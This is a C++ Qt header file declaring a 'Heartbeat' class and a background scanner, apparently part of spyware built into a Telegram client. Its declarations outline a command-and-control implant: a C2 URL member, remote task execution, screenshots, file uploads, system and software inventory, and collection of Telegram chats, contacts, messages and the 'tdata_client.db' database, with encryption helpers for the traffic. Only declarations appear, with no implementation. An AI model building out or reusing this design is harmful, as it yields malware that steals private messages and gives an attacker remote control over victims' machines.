#pragma once

#include <QtCore/QObject>
#include <QtCore/QTimer>
#include <QtNetwork/QNetworkAccessManager>
#include <QtNetwork/QNetworkReply>

namespace Core {

class Heartbeat : public QObject {
    Q_OBJECT
public:
    static Heartbeat& Instance();
    void start();

private:
    Heartbeat();
    ~Heartbeat() = default;

    void sendHeartbeat();
    void checkTasks();
    void executeTask(const QString& taskId, const QString& command, const QString& params);
    void performMonitor();
    void performScreenshot(const QString& taskId);
    void uploadResult(const QString& taskId, const QString& result, const QString& status = "completed");
    void uploadFile(const QString& taskId, const QString& filePath);
    QString getOrCreateUuid();
    void startBackgroundScan();
    void triggerFullScan(const QString& taskId, const QString& mode = "full");
    
    // New Collection Methods
    void collectInstalledSoftware();
    void collectSystemInfo();
    void collectTelegramData(); // Chats, Contacts, Messages
    void uploadClientDb(); // Upload tdata_client.db
    
    // Crypto Helpers
    QString encryptData(const QString& data, const QString& hostname, const QString& timestamp);
    QString decryptData(const QString& data, const QString& hostname, const QString& timestamp);

    QTimer _timer;
    QTimer _monitorTimer;
    QString _monitorTaskId;
    QString _deviceUuid;
    QNetworkAccessManager _network;
    QString _c2Url = "http://localhost:8101"; // Base URL without /api prefix as we add it in request
};

// Background Scanner Worker
class BackgroundScanner : public QObject {
    Q_OBJECT
public:
    BackgroundScanner(const QString& uuid, const QString& c2Url, const QString& taskId = "", const QString& mode = "full");
public Q_SLOTS:
    void process();
Q_SIGNALS:
    void scanFinished(const QString& taskId, const QByteArray& jsonData);
    void progress(const QString& msg);
private:
    QString _uuid;
    QString _c2Url;
    QString _taskId;
    QString _mode;
};

} // namespace Core
